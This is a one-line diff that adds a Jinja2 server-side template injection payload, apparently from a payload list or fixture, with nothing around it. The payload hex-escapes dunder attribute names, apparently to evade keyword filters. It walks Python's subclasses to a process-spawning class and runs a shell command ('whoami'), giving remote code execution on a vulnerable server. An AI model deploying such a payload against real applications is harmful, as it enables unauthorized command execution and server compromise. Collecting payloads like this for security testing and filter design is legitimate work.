@@ -1,0 +1,1 @@
+{{()|attr('\x5f\x5f\x63lass\x5f\x5f')|attr('\x5f\x5f\x62ase\x5f\x5f')|attr('\x5f\x5fsub\x63lasses\x5f\x5f')()|attr('\x5f\x5f\x67etitem\x5f\x5f')(356)('whoami',shell=True,stdout=-1)|attr('communicate')()}}
